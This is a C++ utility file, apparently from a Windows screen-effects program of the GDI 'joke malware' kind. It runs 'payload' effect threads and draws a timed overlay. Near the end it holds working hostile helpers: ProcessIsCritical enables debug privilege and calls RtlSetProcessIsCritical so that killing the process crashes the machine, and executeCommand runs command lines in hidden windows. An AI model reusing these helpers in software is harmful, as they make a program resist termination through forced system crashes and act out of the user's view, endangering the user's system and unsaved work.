#include "utils.h"

#include <cstdint>
#include <string>
#include <vector>
#include <iostream>

#ifdef _MSC_VER
#pragma comment(lib, "Msimg32.lib")
#endif

// ============================================================
// Existing helper
// ============================================================

BOOL CALLBACK EnumProc(HWND hWnd, LPARAM)
{
    ShowWindow(hWnd, SW_SHOW);
    return TRUE;
}

// ============================================================
// EFFECT RUNNER
// ============================================================

HANDLE StartEffect(
    LPTHREAD_START_ROUTINE effect
)
{
    return CreateThread(
        NULL,
        0,
        effect,
        NULL,
        0,
        NULL
    );
}

void WaitEffect(
    HANDLE thread
)
{
    if (!thread)
        return;

    WaitForSingleObject(
        thread,
        INFINITE
    );

    CloseHandle(thread);

    RedrawWindow(
        NULL,
        NULL,
        NULL,
        RDW_INVALIDATE |
        RDW_ERASE |
        RDW_UPDATENOW |
        RDW_ALLCHILDREN
    );

    Sleep(250);
}

void runEffect(
    LPTHREAD_START_ROUTINE effect
)
{
    WaitEffect(StartEffect(effect));
}

// ============================================================
// TEXT/TIMEBAR OVERLAY (Ctrl+F2)
// ============================================================

namespace
{
    const wchar_t* gOverlayName = L"";
    ULONGLONG gOverlayStart = 0;
    ULONGLONG gOverlayDuration = 5000;
    volatile bool gOverlayVisible = false;
    volatile bool gOverlayF2WasDown = false;
}

void OverlaySetPayload(
    const wchar_t* name,
    ULONGLONG durationMs
)
{
    gOverlayName = name;
    gOverlayDuration =
        durationMs ? durationMs : 5000;
    gOverlayStart =
        GetTickCount64();
}

static void DrawOverlay()
{
    HDC dc = GetDC(NULL);

    if (!dc)
        return;

    const int sw =
        GetSystemMetrics(SM_CXSCREEN);

    const int sh =
        GetSystemMetrics(SM_CYSCREEN);

    // Time left in this payload.
    ULONGLONG now = GetTickCount64();

    ULONGLONG elapsed =
        now > gOverlayStart
            ? now - gOverlayStart
            : 0;

    ULONGLONG remaining =
        elapsed >= gOverlayDuration
            ? 0
            : gOverlayDuration - elapsed;

    const int barW =
        sw / 3;

    const int barH = 12;
    const int txtH = 22;
    const int pad = 8;

    const int bx =
        (sw - barW) / 2;

    const int by =
        sh - barH - txtH - pad * 2 - 20;

    // Offscreen surface for the overlay block.
    HDC mem = CreateCompatibleDC(dc);

    if (!mem)
    {
        ReleaseDC(NULL, dc);
        return;
    }

    BITMAPINFO bi{};

    bi.bmiHeader.biSize =
        sizeof(BITMAPINFOHEADER);

    bi.bmiHeader.biWidth = barW;
    bi.bmiHeader.biHeight = -(barH + txtH + pad * 2);
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 32;
    bi.bmiHeader.biCompression = BI_RGB;

    void* bits = nullptr;

    HBITMAP bmp = CreateDIBSection(
        dc,
        &bi,
        DIB_RGB_COLORS,
        &bits,
        NULL,
        0
    );

    if (!bmp)
    {
        DeleteDC(mem);
        ReleaseDC(NULL, dc);
        return;
    }

    HGDIOBJ oldBmp =
        SelectObject(mem, bmp);

    // Backdrop.
    HBRUSH bgBrush =
        CreateSolidBrush(RGB(0, 0, 0));

    HGDIOBJ oldBrush =
        SelectObject(mem, bgBrush);

    PatBlt(
        mem,
        0,
        0,
        barW,
        barH + txtH + pad * 2,
        PATCOPY
    );

    // Timebar.
    int fx =
        static_cast<int>(
            (gOverlayDuration ? remaining : 0) *
            1000 /
            gOverlayDuration
        );

    if (fx < 0)
        fx = 0;

    if (fx > 1000)
        fx = 1000;

    const int fillW =
        barW * fx / 1000;

    HBRUSH barBrush =
        CreateSolidBrush(RGB(0, 170, 255));

    SelectObject(mem, barBrush);

    PatBlt(
        mem,
        0,
        0,
        fillW,
        barH,
        PATCOPY
    );

    SelectObject(mem, bgBrush);

    // Text.
    unsigned seconds =
        static_cast<unsigned>(remaining / 1000);

    wchar_t buf[160];

    wsprintfW(
        buf,
        L"%ls   %02u:%02u",
        gOverlayName,
        seconds / 60,
        seconds % 60
    );

    HFONT font = CreateFontW(
        20,
        0,
        0,
        0,
        FW_NORMAL,
        FALSE,
        FALSE,
        FALSE,
        DEFAULT_CHARSET,
        OUT_DEFAULT_PRECIS,
        CLIP_DEFAULT_PRECIS,
        DEFAULT_QUALITY,
        DEFAULT_PITCH,
        L"Consolas"
    );

    HGDIOBJ oldFont =
        SelectObject(mem, font);

    SetBkMode(mem, TRANSPARENT);
    SetTextColor(mem, RGB(255, 255, 255));

    TextOutW(
        mem,
        4,
        barH + pad,
        buf,
        lstrlenW(buf)
    );

    // Blend overlay (semi-transparent) over the screen.
    BLENDFUNCTION bf{};

    bf.BlendOp = AC_SRC_OVER;
    bf.BlendFlags = 0;
    bf.AlphaFormat = 0;
    bf.SourceConstantAlpha = 160;

    AlphaBlend(
        dc,
        bx,
        by,
        barW,
        barH + txtH + pad * 2,
        mem,
        0,
        0,
        barW,
        barH + txtH + pad * 2,
        bf
    );

    SelectObject(mem, oldFont);
    DeleteObject(font);
    SelectObject(mem, oldBrush);
    DeleteObject(bgBrush);
    DeleteObject(barBrush);
    SelectObject(mem, oldBmp);
    DeleteObject(bmp);
    DeleteDC(mem);
    ReleaseDC(NULL, dc);
}

static DWORD WINAPI OverlayThread(LPVOID)
{
    for (;;)
    {
        Sleep(60);

        bool ctrl =
            (GetAsyncKeyState(VK_CONTROL)
                & 0x8000) != 0;

        bool f2 =
            (GetAsyncKeyState(VK_F2)
                & 0x8000) != 0;

        bool combo = ctrl && f2;

        // Toggle on the rising edge only.
        if (combo && !gOverlayF2WasDown)
            gOverlayVisible =
                !gOverlayVisible;

        gOverlayF2WasDown = combo;

        if (gOverlayVisible)
            DrawOverlay();
    }

    return 0;
}

void StartOverlay()
{
    HANDLE h =
        CreateThread(
            NULL,
            0,
            OverlayThread,
            NULL,
            0,
            NULL
        );

    if (h)
        CloseHandle(h);
}

BOOL EnablePriv(LPCWSTR lpszPriv) {
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkprivs;
    ZeroMemory(&tkprivs, sizeof(tkprivs));

    if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
        return FALSE;

    if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tkprivs.PrivilegeCount = 1;
    tkprivs.Privileges[0].Luid = luid;
    tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
    CloseHandle(hToken);
    return bRet;
}

BOOL ProcessIsCritical() {
    HANDLE hDLL;
    typedef VOID(_stdcall* RtlSetProcessIsCritical)(IN BOOLEAN NewValue, OUT PBOOLEAN OldValue, IN BOOLEAN IsWinlogon);
    RtlSetProcessIsCritical fSetCritical;

    hDLL = LoadLibraryA("ntdll.dll");
    if (hDLL != NULL) {
        EnablePriv(SE_DEBUG_NAME);
        fSetCritical = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
        if (!fSetCritical)
            return 0;
        fSetCritical(1, 0, 0);
        return 1;
    }
    else {
        return 0;
    }
}

void executeCommand(const std::wstring& command) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    std::vector<wchar_t> buf(command.begin(), command.end());
    buf.push_back(L'\0');

    if (!CreateProcessW(NULL, buf.data(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        std::cerr << "CreateProcess failed (" << GetLastError() << ").\n";
        return;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}